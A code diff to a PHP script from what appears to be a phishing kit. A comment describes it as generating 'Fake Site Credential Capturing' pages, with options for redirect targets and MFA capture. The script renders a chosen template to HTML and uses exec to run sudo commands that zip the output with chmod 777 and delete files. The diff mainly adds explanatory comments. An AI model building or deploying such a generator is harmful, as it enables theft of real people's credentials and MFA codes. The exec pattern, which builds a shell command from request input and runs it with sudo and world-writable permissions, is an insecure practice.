@@ -1,9 +1,11 @@
 <?php
 
+// Display Template Options for Fake Site Credential Capturing
 if(isset($_REQUEST['template'])){$template = $_REQUEST['template'];}else{$template = "";}
 
 if(!isset($_REQUEST['APIURL'])){
 
+// The Code Below Displays API Options for HTML Generation to Work With the API
 ?>
 
 <HTML>
@@ -33,6 +35,7 @@ if(!isset($_REQUEST['APIURL'])){
 </HTML>
 <?php } else {
 
+// If the Form Has Already Been Posted, Grab Parameters
 if(isset($_REQUEST['APIURL'])){$APIURL = $_REQUEST['APIURL'];}else{$APIURL = $_SERVER['SERVER_NAME'];}
 if(isset($_REQUEST['Project']) && $_REQUEST['Project'] != ""){$Project = $_REQUEST['Project'];}else{$Project = "Undefined Project";}
 if(isset($_REQUEST['Redirect']) && $_REQUEST['Redirect'] != "https://"){$Redirect = $_REQUEST['Redirect'];}else{$Redirect = "https://www.google.com";}
@@ -43,11 +46,10 @@ if(isset($_REQUEST['Title'])){$Title = $_REQUEST['Title'];}else{$Title = "";}
 if(isset($_REQUEST['MFA'])){$MFA = $_REQUEST['MFA'];}else{$MFA = "off";}
 if(isset($_REQUEST['MFArequired'])){$MFArequired = $_REQUEST['MFArequired'];}else{$MFArequired = "off";}
 
+// Generate HTML From Selected Template
 $templatename = preg_replace('/[^a-zA-Z0-9 ]/', '', $_REQUEST['templatename']);
 
 $htmlpath = $templatename."/template.php";
-
-//include($htmlpath);
 
 ob_start();
 include_once($htmlpath);
@@ -58,9 +60,11 @@ $my_file = $templatename."/index.html";
 $handle = fopen($my_file, 'w') or die('Cannot open file:  '.$my_file);
 fwrite($handle, $html);
 
+// Zip up Generated HTML and Clean Up
 $cmdzipup = "sudo rm ".$templatename.".zip; cd ".$templatename."; sudo zip -r ../".$templatename.".zip ".$templatename." *; sudo chmod 777 ../".$templatename.".zip; sudo rm index.html;";
 exec($cmdzipup);
 
+// Display Download Button for Generated HTML as an Archive
 ?>
 
 <HTML>
